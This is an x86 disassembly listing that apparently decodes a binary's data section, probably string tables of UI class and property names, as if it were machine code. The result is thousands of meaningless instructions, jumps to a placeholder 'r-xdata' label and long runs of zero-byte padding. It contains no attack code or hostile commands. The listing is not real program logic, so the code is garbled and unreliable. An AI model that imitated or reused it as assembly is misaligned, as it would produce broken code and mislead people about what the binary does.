add al 0x44
add [ esp + eax + 0x54110044 ] dh
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add [ eax + eax + 0x60 ] al
add eax [ eax + eax - 0x1c ]
inc [ ebx ]
cmp [ ecx ] al
inc esp
add [ ecx + eax ] bh
inc esp
add [ ecx + eax + 0x44 ] al
add [ ebx + eax + 0x2cc0044 ] bh
inc esp
add [ esp + eax ] al
inc esp
add [ eax ] al
nop
salc
inc ebx
add [ esp + esi + 0x40 ] bh
add [ ecx + eax + 0x1940044 ] ah
inc esp
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x304418ea
add eax [ eax + eax + 0x30 ]
add al [ eax + eax - 0x58 ]
add al 0x44
add [ ecx + eax ] bl
inc esp
add [ eax ] ah
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ eax ] dh
add al [ eax + eax + 0x64 ]
add al [ eax + eax + 0x7c ]
add al [ eax + eax + 0x20 ]
inc ebx
outsd
outsb
je r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
add [ eax + eax - 0x7c ] al
inc [ ebx ]
in al 0xff
xor [ eax ] eax
and al 0x32
inc eax
add ah bl
inc [ ebx ]
and [ ecx ] al
inc esp
add [ ecx + eax ] bl
inc esp
add [ eax ] ah
outsd
insd
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffff84441aea
cmovb eax [ eax ]
cld
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ ebx + 0x43d980c0 ] cl
add [ edx + eax + 0x44 ] bh
add [ eax ] ah
inc esp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx * 8 - 0x2a ] si
inc ebx
add [ eax - 0x2a ] ch
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
push esp
inc esp
jb r-xdata
cmp [ ecx ] al
inc esp
add [ ecx + eax ] bh
inc esp
add [ ecx + eax + 0x44 ] al
add [ ebx ] cl
je r-xdata
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x43db5090
add [ ebx ] al
or al 0x54
sbb [ eax + eax - 0x48 ] al
cmovb eax [ eax ]
sbb al 0x1b
add [ esp + esi + 0x34900040 ] cl
inc eax
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 8 + 0x700043 ] bh
add [ eax ] al
jo r-xdata
inc ebx
inc esp
add [ eax + 0x4004402 ] ch
add al [ eax + eax - 0x4c ]
add [ eax + eax + 0x12 ] eax
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
inc ebx
add [ eax ] bh
add [ eax + eax + 0x3c ] eax
add [ eax + eax + 0x44 ] eax
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
add [ esp + ebx * 8 ] dl
inc ebx
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
outsd
insd
popad
je r-xdata
inc ebx
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
inc ebx
add [ eax + eax ] ah
add ah dl
and al 0x42
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffff8c441a4a
push ss
inc esp
add [ eax - 0x55 ] cl
inc ecx
add [ eax - 0x55 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
fiadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xda
dec eax
fiadd [ ebx ]
pop es
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
add [ ebp - 0x285fffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ esp + ebx * 8 + 0x8060043 ] bh
push esp
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
inc esp
add ah ch
cmovb eax [ eax ]
enter 0x441b 0x0
cmp al 0xf
inc edx
add al dl
cmovb eax [ eax ]
and al 0x10
inc edx
add [ ebx + ebx ] bl
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
sbb [ eax + eax + 0x50 ] al
stosd [ edi ]
add [ eax - 0x24 ] esi
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al cl
fild [ ebx ]
or esp [ ebx + esi * 2 + 0x44 ]
jb r-xdata
dec esp
fadd [ ebx ]
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + ebx * 8 + 0x43 ] cl
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
test [ edi ] cl
inc edx
add ah bh
jae r-xdata
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
add [ ecx ] ecx
inc ebp
outsb
je r-xdata
dec ebp
outsd
jne r-xdata
push esp
ror ah 0xdb
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
fild [ ebx ]
sbb al 0x0
add [ eax ] al
mov eax 0x7c0044ea
xor al 0x40
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
fiadd [ ebx ]
inc eax
and eax 0x40042
or [ ebx + 0x6f ] al
outsb
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
pop esp
sbb [ eax + eax + 0x1 ] al
inc ebx
outsd
outsb
jae r-xdata
inc ecx
add [ edx + ebp * 4 + 0x41 ] ah
add al ch
sbb [ eax + eax - 0x28 ] al
add [ eax - 0x55 ] dl
imul ebp [ esi + 0x74 ] 0x657a6953
jb r-xdata
jb r-xdata
inc eax
add [ esp + esi + 0x34900040 ] cl
inc eax
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
inc edx
add [ eax ] cl
sbb al [ eax + eax - 0x60 ]
int1
inc esp
add [ edx + ebx + 0x44 ] bh
add al cl
int1
inc esp
add ah bl
int1
inc esp
add ah dh
sbb eax [ eax + eax - 0x50 ]
sbb al [ eax + eax + 0x18 ]
inc esp
add [ edx + esi * 8 ] ch
inc esp
add al ch
sbb al [ eax + eax + 0x54 ]
inc esp
add [ ebx + ebx + 0x44 ] al
add [ edx + esi * 8 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] ah
add [ edx + esi * 8 + 0x44 ] ah
add [ eax + 0x1c ] bh
inc esp
add [ eax + 0x1c ] bl
inc esp
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ebp + 0x61 ] cl
fadd [ ebx ]
adc al 0x0
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
int3
add bh bh
pop esp
sbb [ eax + eax + 0x1 ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
and dh bl
inc ebx
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x43dccc74
jb r-xdata
popad
jb r-xdata
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
jae r-xdata
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
cmp [ edx + 0x18140041 ] ch
inc esp
nop
xor al 0x40
outsd
insb
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
add [ eax - 0x7bffbbe4 ] bl
sbb eax [ eax + eax + 0x78 ]
inc esp
add [ edx + esi * 8 + 0x44 ] bh
add [ eax + 0x1800441b ] ch
sbb [ eax + eax + 0x12 ] eax
push esp
inc ebx
outsd
outsb
je r-xdata
sbb al 0x44
fild [ ebx ]
add ecx [ ecx ]
push esp
inc esp
jb r-xdata
add [ ebp - 0x2543ffc0 ] cl
inc ebx
add [ eax ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
outsb
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
adc [ eax ] al
add bh bh
pop esp
sbb [ eax + eax + 0x1 ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
fadd [ ebx ]
imul ebp [ esi + 0x74 ] 0x43dd3873
add [ eax - 0x7f ] dh
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
add [ ecx ] al
imul ebp [ esi + 0x74 ] r-xdata
fld [ fs : ebx ]
pop es
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0xdc74c08b
dec esp
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
add [ eax + eax ] dl
inc ebx
outsd
insb
jae r-xdata
outsb
mov eax eax
je r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
jae r-xdata
insb
jae r-xdata
pop ss
inc esp
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
inc esp
add al bl
add eax 0x0
inc ebx
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ esi + 0x64 ] 0x1
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
sbb ah bl
inc ebx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
insb
add [ ecx + edx + 0x40 ] bl
add [ eax - 0x1bffbff0 ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
[ eax + ebx + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add ah cl
fadd [ ebx ]
or [ eax ] al
add bh bh
pop esp
sbb [ eax + eax + 0x1 ] al
push esp
push esp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
inc ebx
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ ebx ] al
add [ eax ] al
add [ eax - 0x24 ] dh
inc ebx
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ eax ] cl
push cs
push esp
add [ eax + r-xdata ] dl
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ ecx + edx + 0x40 ] bl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add al cl
fild [ ebx ]
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jns r-xdata
adc [ eax ] 0x40
add ah ah
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x43dccc74
imul esp [ gs : edi + 0x68 ] 0x43dccc74
add [ eax + eax ] cl
add bh bh
add [ ecx ] al
add [ eax ] al
add [ ebx + ebx * 8 + 0x64080043 ] cl
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add [ eax ] bl
fadd [ ebx ]
add ecx [ ecx ]
push esp
inc esp
jb r-xdata
jb r-xdata
je r-xdata
inc esp
jb r-xdata
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
inc esp
jb r-xdata
pop esp
adc [ eax ] eax
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
outsb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
push esp
dec ebx
jns r-xdata
inc ebx
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
insb
loopne r-xdata
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
enter 0x43db 0x0
outsb
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
pop esp
adc [ eax ] eax
in al 0x79
inc ecx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x2103ffc0 ] cl
inc ebx
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
inc ebx
add [ eax + 0xd080043 ] dh
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
or [ esi ] al
outsb
je r-xdata
add [ eax - 0x2a ] ch
jb r-xdata
je r-xdata
je r-xdata
pop esp
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
adc cl ah
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
adc [ eax ] eax
push 0xb40043d6
loopne r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5c ] si
pop es
dec ecx
outsb
je r-xdata
inc esp
push ebx
outsb
add al 0x8
push es
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
je r-xdata
jb r-xdata
add [ eax ] cl
or eax 0x646e4554
inc esp
add [ ebx ] eax
outsb
je r-xdata
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
pop esp
adc [ eax ] eax
or cl bl
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x1e87ffc0 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
pop esp
adc [ eax ] eax
pop esp
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
push esp
inc ebp
outsb
jb r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x40 ] bl
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
test bh bl
inc ebx
inc ebx
push 0x5c007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x207bffc0 ] cl
push ebx
add ecx [ eax ]
push es
add [ ebx + 0x43de98c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
pop esp
adc [ eax ] eax
dec esp
fild [ ebx ]
in al 0x79
inc ecx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ eax ] cl
fld [ ebx ]
push esp
adc [ eax ] al
push esp
adc [ eax ] al
enter 0x43db 0x0
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
pop esp
adc [ eax ] eax
pop esp
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
pop esp
adc [ eax ] eax
or cl bl
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add al cl
fild [ ebx ]
outsb
je r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
jb r-xdata
jb r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ eax - 0x18 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
dec esp
jecxz r-xdata
add [ edi ] eax
inc ebx
popad
je r-xdata
outsb
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
pushad
call sub_43e37f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43e34cc0 ] cl
outsb
je r-xdata
pop es
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5c ] si
adc [ eax ] eax
or cl bl
inc ebx
add al al
loop r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc ebx
jpe r-xdata
add eax 0x65530608
outsb
jb r-xdata
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx + 0x40 ] bl
add [ eax - 0x18 ] ah
inc ebx
add [ eax ] bh
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
inc eax
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
dec esp
in al 0x43
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov esp 0x80043e3
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43e4d4c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x43e44cc0 ] cl
add [ eax + edx + 0x40 ] dl
inc ebp
jbe r-xdata
inc ebp
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
insb
outsd
ja r-xdata
jbe r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
aam 0xe4
inc ebx
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
je r-xdata
outsb
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
imul ebp [ esi + 0x74 ] 0x61480701
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
dec eax
in eax 0x43
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
jne r-xdata
inc ebp
js r-xdata
outsb
je r-xdata
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x560043e6 ] dl
call 0x19fe609
js r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
pop esp
adc [ eax ] eax
push esp
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
pop es
inc edx
add [ eax - 0x33ffbfcc ] dl
aas
inc esp
add ah cl
xor [ eax ] eax
call 0xffffffff9044261a
sbb eax 0x4cac0044
add [ ecx * 4 + 0xe980041 ] dh
inc edx
add [ eax - 0x27ffbfcc ] cl
inc ebp
add [ eax ] al
xor al 0x8d
inc ecx
push eax
outsd
jo r-xdata
add al 0x8
push es
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
imul esp [ esi + 0x74 ] 0x6853540b
imul esp [ esi + 0x74 ] 0x74617453
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
